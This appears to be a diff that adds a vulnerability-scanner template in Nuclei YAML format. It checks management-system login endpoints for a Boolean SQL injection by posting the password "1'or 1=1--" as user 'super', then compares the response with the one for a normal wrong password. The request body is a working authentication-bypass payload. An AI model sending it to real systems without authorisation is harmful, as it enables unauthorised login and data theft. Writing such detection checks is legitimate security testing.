@@ -1,0 +1,43 @@
+id: multiple-management-systems-sqli
+info:
+  name: Multiple Management Systems Login Boolean SQLi
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a Boolean SQL injection vulnerability in the login of multiple information management systems. An attacker can directly log in to the system using a universal password such as "1'or 1='1", and even obtain sensitive information from the database through Boolean blind injection.
+  tags: sqli,boolean
+  metadata:
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        POST /login/doAction HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 142
+
+        {"usercode":"super","password":"1'or 1=1--","verificationcode":"","remember":true,"ip":"","city":""}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"status\":\"success\""
+        part: body
+
+  - raw:
+      - |
+        POST /login/doAction HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 117
+
+        {"usercode":"super","password":"1","verificationcode":"","remember":true,"ip":"","city":""}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"status\":\"error\""
+        part: body
+
+flow: http(1) && http(2)
